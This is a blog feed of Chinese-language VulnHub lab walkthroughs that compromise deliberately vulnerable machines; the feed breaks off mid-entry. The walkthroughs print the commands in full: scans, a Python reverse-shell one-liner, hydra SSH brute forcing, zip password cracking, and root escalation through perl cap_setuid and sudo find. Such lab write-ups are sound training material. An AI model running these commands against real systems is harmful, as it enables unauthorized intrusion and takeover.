{
    "version": "https://jsonfeed.org/version/1",
    "title": "X_T • All posts by \"vulnhub 31-40\" tag",
    "description": "人生如逆旅，我亦是行人",
    "home_page_url": "https://n1h1l157.github.io",
    "items": [
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/",
            "title": "VULNHUB 31 PROXIMACENTAURI",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tcHJveGltYWNlbnRhdXJpLDcwOS8=\">https://www.vulnhub.com/entry/hacksudo-proximacentauri,709/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDM0NzYyL2FydGljbGUvZGV0YWlscy8xMTg2NjM1NTE=\">https://blog.csdn.net/qq_45434762/article/details/118663551</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-786.png\" alt></p>\n<p>-&gt; 靶机 ip：192.168.31.5</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.5</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-787.png\" alt></p>\n<p>-&gt; 靶机开放端口 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNQ==\">http://192.168.31.5</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-788.png\" alt></p>\n<p>目录扫描:  <code>gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.5</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-789.png\" alt></p>\n<p>找到很多目录，暂时不知道哪个目录比较敏感，需要依次访问</p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzLw==\">http://192.168.31.5/docs/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-790.png\" alt></p>\n<p>看到一个 php 后缀的文件，点开看看:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzL3VwZGF0YS5waHA=\">http://192.168.31.5/docs/updata.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-791.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-792.png\" alt></p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9pbWFnZXMv\">http://192.168.31.5/images/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-793.png\" alt></p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9sb2dpbi5waHA=\">http://192.168.31.5/login.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-794.png\" alt></p>\n<p>-&gt; 得到一个后台的登陆地址，并且该 web 是有 pluck 4.7.13 写出来的</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy8=\">http://192.168.31.5/files/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-795.png\" alt></p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9hZG1pbi5waHA=\">http://192.168.31.5/admin.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-796.png\" alt></p>\n<p>管理员的后台地址，会自动跳转到 login 界面</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9yb2JvdHMudHh0\">http://192.168.31.5/robots.txt</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-797.png\" alt></p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9wbGFuZXQv\">http://192.168.31.5/planet/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-798.png\" alt></p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQv\">http://192.168.31.5/files/planet/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-799.png\" alt></p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQuaHRtbA==\">http://192.168.31.5/files/planet.html</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-800.png\" alt></p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9yZXF1aXJlbWVudHMucGhw\">http://192.168.31.5/requirements.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-801.png\" alt></p>\n<p>找不到更多的线索了，根据已有的进行总结，发现只有一个 pluck 4.7.13 的信息，和一个后台的登陆地址可以利用</p>\n<h3 id=\"pluck-漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#pluck-漏洞利用\">#</a> pluck 漏洞利用</h3>\n<p>用 searchsploit 搜索寻 pluck 对应版本漏洞，发现存在一个授权才能访问的 RCE 漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-802.png\" alt></p>\n<p>确认 payload 的位置，将其复制到自己的目录下</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-803.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-804.png\" alt></p>\n<p>阅读此 py 文件，根据脚本中的内容，带参数执行脚本</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-805.png\" alt></p>\n<p>由于此漏洞只适应于 pluck 的授权 RCE，此处如果不能破解出来其账户和密码，显然无法使用，经尝试并不是弱口令，放弃这个目标，继续信息搜集</p>\n<h3 id=\"dirb-扩大信息面\"><a class=\"markdownIt-Anchor\" href=\"#dirb-扩大信息面\">#</a> dirb 扩大信息面</h3>\n<p>dirb 的优点在于搜集到一级目录后，还会继续尝试二级目录的识别</p>\n<p>用 dirb 收集更多的字目录信息: <code>dirb 192.168.31.5</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-806.png\" alt></p>\n<p>依次去打开这些二级目录，发现了一个敏感的地址:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoLw==\">http://192.168.31.5/data/trash/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-807.png\" alt></p>\n<p>继续向下深入，看三级目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoL2ZpbGVzL3NoZWxsLnBoYXI=\">http://192.168.31.5/data/trash/files/shell.phar</span></p>\n<p>最终在此路径下找到了一个 shell.phar 的文件，此命名就比较敏感</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-808.png\" alt></p>\n<p>-&gt; 访问此目录，是一个 webshell，现在拿到了网站权限</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-809.png\" alt></p>\n<p>在网站上执行命令有诸多不便，需要将其反弹到终端上</p>\n<p>检测到服务器没有 nc，有一个 python3 ，就用 python3 来反弹 shell<br>\n <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.75 &quot;,444 4 ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-810.png\" alt></p>\n<p>设置 stty 的格式，输出为一个比较美观的终端</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-811.png\" alt></p>\n<h3 id=\"端口敲门\"><a class=\"markdownIt-Anchor\" href=\"#端口敲门\">#</a> 端口敲门</h3>\n<p>敲门（knock）指的是我们从自己的客户端设备（pc、笔记本或者手机）向服务器 IP 发送一系列实现约好的暗号，而服务器上需要相应的安装接收暗号的服务 knockd，它在接收到正确的暗号的时候，会临时性的为敲门者开一段时间的门并随后关上（当然也能够配置成一直开着），我们要在这几秒钟里面登录成功并且保持连接，如果不小心断了连接就要重新敲门。</p>\n<p>拿到服务器的权限之后，去看了一些敏感文件，敏感权限之后都没有任何问题，筛选端口的时候发现 knock 命令</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-812.png\" alt></p>\n<p>查看 knock 的配置文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-813.png\" alt></p>\n<p>找到了一个 root 账户的端口敲门的配置问题，依次去敲击 14,29,43 端口可以将防火墙规则调整为开放，依次去敲击 62,40,46 端口可以将防火墙规则调整为关闭，注意有一个两个端口之间的间隔时间不能大于 15 ms</p>\n<p>依次按顺序敲击这三个端口 <code>sudo nmap -p 14,29,43 192.168.31.5</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-814.png\" alt></p>\n<p>敲击端口前，是 22 是被过滤的，端口敲门之后并没有立即将端口轰开，反而是等待了一段时间之后才将 22 端口打开，现在 22 已经打开，可以通过 ssh 去连接这台服务器了，但是我们并没有 root 账户的密码，怎么去连接呢。</p>\n<p>先直接去做，看能不能有什么收获 <code>ssh root@192.168.31.5</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-815.png\" alt></p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 ssh</h3>\n<p>看到了一个 github 地址，点开进入</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-816.png\" alt></p>\n<p>发现是一系列密码并且提示用 proxima、centauri 进行爆破，将字典加载到本地，准备用 hydra 爆破一波</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-817.png\" alt></p>\n<p>查看到服务器上存在的用户</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-818.png\" alt></p>\n<p>服务器存在 proxima、centauri 用户，将这两个名字写到 user.txt 中，用 hydra 进行爆破</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-819.png\" alt></p>\n<p><code>hydra -L user.txt -P passwd.txt ssh://192.168.31.5 -t 4 -I -vV -o hydra.ssh</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-820.png\" alt></p>\n<p>很遗憾，爆破失败，继续往下做，在实际测试中，经常有爆破失败的情况，我们需要从更多的角度去收集服务器的信息，经过检查，发现服务器上存在 mysql 的备份文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-821.png\" alt></p>\n<p>-&gt; 备份文件中就有用户名和密码，alfauser:passw0rd</p>\n<h3 id=\"数据库信息泄露\"><a class=\"markdownIt-Anchor\" href=\"#数据库信息泄露\">#</a> 数据库信息泄露</h3>\n<p>登陆数据库，查询敏感账户和密码： <code>mysql -u alfauser -p</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-822.png\" alt></p>\n<p>连接成功，搜索敏感文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-823.png\" alt></p>\n<p>一翻搜索后，在数据库中找到了 proxima 账户和其密码，切换账户至 proxima 账户，成功拿到其 shell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-824.png\" alt></p>\n<h3 id=\"cap_setuid-提权\"><a class=\"markdownIt-Anchor\" href=\"#cap_setuid-提权\">#</a> cap_setuid 提权</h3>\n<p>接下来要想办法提权至 root，直接上监控 linpeas 看有什么可疑的文件<br>\n <code>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-825.png\" alt></p>\n<p>运行 linpeas 进行检测</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-826.png\" alt></p>\n<p>使用 linpeas 之后监测到一个权限设置错误的命令 perl</p>\n<p>Capabilities 是 linux 的一种访问控制能力，能够更精细化的将操作系统权限（网络，文件等）赋权给应用程序，其中就包括设置 uid 和 gid 的权限。因此具备 cap_setuid 和 cap_setgid 权限的程序可以用来进行权限提升。</p>\n<p>提权利用命令在 gtfobins 上可以找到更多：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGVybC8=\">https://gtfobins.github.io/gtfobins/perl/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-827.png\" alt></p>\n<p>看官方介绍，也就是为了细分 root 权限的 capabilities，但是也会因为设置错误导致权限提升</p>\n<p><code>./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-828.png\" alt></p>\n<p>-&gt; 成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/132%20JETTY/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/132%20JETTY/",
            "title": "VULNHUB 32 JETTY",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamV0dHktMSw2MjEv\">https://www.vulnhub.com/entry/jetty-1,621/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkyMjI3OC9hcnRpY2xlL2RldGFpbHMvMTEzNzA1Mjgx\">https://blog.csdn.net/weixin_45922278/article/details/113705281</span></p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31.135<br>\n 靶机 JETTY：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n sudo arp-scan -l</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-829.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 66</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n sudo nmap - PA 192.168.31. 66</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-830.png\" alt></p>\n<p>à 靶机开放端口 21 ， 80</p>\n<h3 id=\"002-ftp弱口令frackzipjohn破解zip敏感信息总结\"><a class=\"markdownIt-Anchor\" href=\"#002-ftp弱口令frackzipjohn破解zip敏感信息总结\">#</a> 002 ftp 弱口令，frackzip/john 破解 zip，敏感信息总结</h3>\n<p>先从 ftp 进行下手，尝试弱口令登陆成功</p>\n<p>看到 ftp 服务中存在两个文件，将文件下载下来</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-831.png\" alt></p>\n<p>可以用 lcd 来在 ftp 服务中控制 kali 的目录，进行下载文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-832.png\" alt></p>\n<p>查看下载下来的两个文件，其中 README.txt 中给了 Henry、Michael 的用户名<br>\n解压 sshpass.zip 的时候发现其是有密码认证的，需要破解 zip</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-833.png\" alt></p>\n<p>fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-834.png\" alt></p>\n<p>也可以使用 zip 2 john 将加密的 zip 转化为可以用 john 破解的<br>\n zip2join sshpass.zip &gt; ssh.txt<br>\njohn ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-835.png\" alt></p>\n<p>得到 zip 的密码为 seahorse！进行解压</p>\n<p>解压后即得到了 ssh 的密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-836.png\" alt></p>\n<p>到目前为止我们已经得到了 ssh 的一个疑似账户 Henry 和一个 ssh 密码<br>\n但是我们扫描端口时并没有发现 ssh 协议是开启的，还需要其他的信息收集</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 66 / 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-837.png\" alt></p>\n<h3 id=\"识别目录看能否找到更多的目录信息\"><a class=\"markdownIt-Anchor\" href=\"#识别目录看能否找到更多的目录信息\">#</a> 识别目录，看能否找到更多的目录信息</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-838.png\" alt></p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjYvcm9ib3RzLnR4dA==\">http://192.168.31.66/robots.txt</span> 发现了四个目录，依次访问之后没有发现</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-839.png\" alt></p>\n<h3 id=\"到此为止我们的信息收集工作就做完了但是仍然还有个问题为什么没有\"><a class=\"markdownIt-Anchor\" href=\"#到此为止我们的信息收集工作就做完了但是仍然还有个问题为什么没有\">#</a> 到此为止，我们的信息收集工作就做完了，但是仍然还有个问题，为什么没有</h3>\n<p>开启 ssh 协议，是不是之前识别的结果有问题？还有就是 ssh 用户名只有这一<br>\n个吗，还有没有其他的可能的用户名。<br>\n带着问题去看 vulnhub 上给出的提示，发现了一个用户名 Squiddie</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-840.png\" alt></p>\n<p>其次，用 nmap 再次更详细的扫描一下端口，看能否扫描到 ssh 协议</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-841.png\" alt></p>\n<p>经过这一次的扫描，扫描到了 65507 端口开放的是 ssh 协议<br>\n可能因为这个端口在比较靠后的位置，并且不是常用的端口，所以第一次扫描<br>\n的时候并没有扫到</p>\n<h3 id=\"003-hydra指定端口爆破find提权\"><a class=\"markdownIt-Anchor\" href=\"#003-hydra指定端口爆破find提权\">#</a> 003 hydra 指定端口爆破，find 提权</h3>\n<p>现在我门就通过 hydra 爆破 65507 端口处的 ssh 协议，并且指定用户名为<br>\n Henry、Michael、Squiddie 以及这三个及首字母变为小写的三个，密码为爆破<br>\n zip 之后解压出来的密码<br>\n hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh<br>\nssh <span class=\"exturl\" data-url=\"bWFpbHRvOnNxdWlkZGllQDE5Mi4xNjguMzEuNjY=\">squiddie@192.168.31.66</span> -p 65507</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-843.png\" alt></p>\n<p>ssh <span class=\"exturl\" data-url=\"bWFpbHRvOnNxdWlkZGllQDE5Mi4xNjguMzEuNjY=\">squiddie@192.168.31.66</span> - p 65507</p>\n<h1 id=\"我用识别工具识别的pdf居然裁剪的图片也被发现了\"><a class=\"markdownIt-Anchor\" href=\"#我用识别工具识别的pdf居然裁剪的图片也被发现了\">#</a> ？？我用识别工具识别的 pdf，居然裁剪的图片也被发现了？？？</h1>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-844.png\" alt></p>\n<p>靶机里边装了一个 python 2 的命令，输入 python 2 打开其命令行</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>import pty<br>\npty.spawn(&quot;/bin/bash&quot;)<br>\n 得到一个标准的 shell</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-846.png\" alt></p>\n<p>sudo - l 时发现了可以无密码调用 root 的 find 命令，利用 find 提权<br>\n sudo find. -exec /bin/sh ; -quit</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-847.png\" alt></p>\n<p>à 成功拿到了 root 权限</p>\n<h3 id=\"004-调查取证利用uncompyle6进行反编译pyc文件\"><a class=\"markdownIt-Anchor\" href=\"#004-调查取证利用uncompyle6进行反编译pyc文件\">#</a> 004 调查取证，利用 uncompyle6 进行反编译 pyc 文件</h3>\n<h3 id=\"此靶机的目标是找到犯罪证据还需进一步的深入测试\"><a class=\"markdownIt-Anchor\" href=\"#此靶机的目标是找到犯罪证据还需进一步的深入测试\">#</a> 此靶机的目标是找到犯罪证据，还需进一步的深入测试</h3>\n<p>查看定时任务 crontab -l 发现有一个备份文件一直在执行<br>\n此命令就是做一个备份，跟踪找到这个.docs 的文件夹查看内容</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-848.png\" alt></p>\n<p>这里有几个 xlsx 的文件以及一个文件夹，也许这几个文件就是犯罪证据，我们<br>\n将这些文件都发送到 kali 机器上，用 scp/ftp/python 等方式进行传输<br>\n scp -r * <span class=\"exturl\" data-url=\"bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjY1\">parallels@192.168.31.65</span>:~/Desktop/tool/jetty/doc/</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-849.png\" alt></p>\n<p>Kali 机器接受到文件之后，直接双击打开这些 xlsx 的文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-850.png\" alt></p>\n<p>错误内容显示架构不支持，因为此 kali 机器是在 mac M1 上虚拟出来的虚拟<br>\n机，是 arm 架构的 kali，所以有些东西是没有兼容的</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-851.png\" alt></p>\n<p>并且 Password_kepper 文件夹中有一个 exe 的 windows 上才能执行的可执行文<br>\n件，是需要发到 windows 机器上才能运行的</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-852.png\" alt></p>\n<p>这个地方我再次通过 scp 将这些文件都传输到了一般用的 amd 的 windows 机器<br>\n ping 192.168.31.91<br>\nscp -r * <span class=\"exturl\" data-url=\"bWFpbHRvOmFkbWluaXN0cmF0b3JAMTkyLjE2OC4zMS45MQ==\">administrator@192.168.31.91</span>:/E:/Desktop/doc/</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-853.png\" alt></p>\n<h3 id=\"传输成功结果如下图\"><a class=\"markdownIt-Anchor\" href=\"#传输成功结果如下图\">#</a> 传输成功，结果如下图</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-854.png\" alt></p>\n<p>xlsx 文件需要密码才能解开</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-855.png\" alt></p>\n<p>运行 exe 文件，发现有个选项可以查看密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-856.png\" alt></p>\n<p>大致浏览了一下所有的信息之后，发现这个 exe 文件是用 pyinstaller 编译出来<br>\n的，既然如此，接下来我们的目标就是去反编译这个 exe 文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-857.png\" alt></p>\n<p>下载在 github 上用于反编译 pyinstaller 生成的文件的工具 pyinstxtractor<br>\nwget <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V4dHJlbWVjb2RlcnMtcmUvcHlpbnN0eHRyYWN0b3IuZ2l0\">https://github.com/extremecoders-re/pyinstxtractor.git</span><br>\n 由于是在 windows 上机器操作，wget 命令需要自己下载并配置为全局的环境变<br>\n量，或者通过 git 来下载，也可以直接经过图像化界面来下载</p>\n<p>Python 2 <span class=\"exturl\" data-url=\"aHR0cDovL3B5aW5zdHh0cmFjdG9yLnB5\">pyinstxtractor.py</span> password_keeper.exe<br>\n 执行之后会在 pyinstxtractor.py 同目录下生成一个文件夹（注意，使用 python2</p>\n<p>运行，python3 我这里会在反编译 pyc 的那一步报错）</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-858.png\" alt></p>\n<p>会在同一目录下产生一个 password_keeper.exe_extracted 目录，在目录下找到关</p>\n<p>键 pyc 文件也就是 password_keeper.pyc，再将这个文件反编译。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-859.png\" alt></p>\n<p>使用 uncompyle6 反编译 pyc 文件<br>\n安装 uncompyle<br>\npip install uncompyle</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-860.png\" alt></p>\n<p>反编译 pyc 文件<br>\n uncompyle6 .\\password_keeper.pyc &gt; password_keeper.py</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-861.png\" alt></p>\n<h3 id=\"对得到的远吗进行代码审计理清功能大致如下\"><a class=\"markdownIt-Anchor\" href=\"#对得到的远吗进行代码审计理清功能大致如下\">#</a> 对得到的远吗进行代码审计，理清功能大致如下</h3>\n<p>我们输入选项之后，需要我们输入一个密钥，将此密钥进行 base 64 加密后与代<br>\n码中的 key 进行比对，如果是相同的就会输出密码</p>\n<p>需要将 N2FlMjE4ZmYyOTI4ZjZiMg<mark> 先进行 base 64 解密<br>\n echo “N2FlMjE4ZmYyOTI4ZjZiMg</mark>” ｜ base 64 - d</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-862.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-863.png\" alt></p>\n<p>运行 exe 文件，输入 1 ，然后输入解密后的密钥 7ae218ff2928f6b2</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-864.png\" alt></p>\n<p>得到了五个密码，分别是这五个 xlsx 的密码<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-865.png\" alt></p>\n<p>à 成功拿到犯罪证据</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/133%20GROTESQUE3/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/133%20GROTESQUE3/",
            "title": "VULNHUB 33 GROTESQUE3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTMwMSw3MjMv\">https://www.vulnhub.com/entry/grotesque-301,723/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdHpmMS9hcmNoaXZlLzIwMjEvMTAvMjEvMTU0MzUwNjYuaHRtbCNnYWxsZXJ5LTE2\">https://www.cnblogs.com/tzf1/archive/2021/10/21/15435066.html#gallery-16</span></p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31. 69<br>\n 靶机 GROTESQUE 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep ‘a0’ ; rm -f 1.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-866.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 63</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n sudo nmap -p- 192.168.31. 63</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-867.png\" alt></p>\n<p>à 靶机开放端口 22 ， 80</p>\n<h3 id=\"002-信息收集md-5-加密字典构造爆破md-5-目录\"><a class=\"markdownIt-Anchor\" href=\"#002-信息收集md-5-加密字典构造爆破md-5-目录\">#</a> 002 信息收集，md 5 加密字典构造，爆破 md 5 目录</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==\">http://192.168.31.102/</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-868.png\" alt></p>\n<h3 id=\"这里有一个地址点击这个地址会跳转到一个页面\"><a class=\"markdownIt-Anchor\" href=\"#这里有一个地址点击这个地址会跳转到一个页面\">#</a> 这里有一个地址，点击这个地址会跳转到一个页面</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjMvYXRsYXNnLmpwZw==\">http://192.168.31.63/atlasg.jpg</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-869.png\" alt></p>\n<h3 id=\"提示指向了这个图片看来这个图片有一些线索仔细查看这个图片\"><a class=\"markdownIt-Anchor\" href=\"#提示指向了这个图片看来这个图片有一些线索仔细查看这个图片\">#</a> 提示指向了这个图片，看来这个图片有一些线索，仔细查看这个图片</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-870.png\" alt></p>\n<p>图片中的一部分有这么一张小图片，有 MD 还有 5 个 X，很显然是 md 5<br>\n 那么这个 md 5 加密有什么可以利用的地方吗？可能会是目录采用的 md 5 加密，<br>\n 可能是某个特殊的文件地址的前缀是 md 5 的字符串<br>\n终端里边进行 md 5 加密和解密分别为如下操作<br>\n echo “xxx” | md5sum<br>\nJohn 1.txt –format=Raw-MD5 –wordlist=/usr/share/wordlists/dirbuster/directory –<br>\nfork =2</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-871.png\" alt></p>\n<p>抓取网站的数据包，通过 burp 代理浏览器数据</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-872.png\" alt></p>\n<p>设置攻击类型为 Cluster bomb，即两个字段采用两个不同的字典<br>\n第一个字段填一个比较常用的爆破字典</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-873.png\" alt></p>\n<h3 id=\"第二个字典填一个经常用的后缀如下\"><a 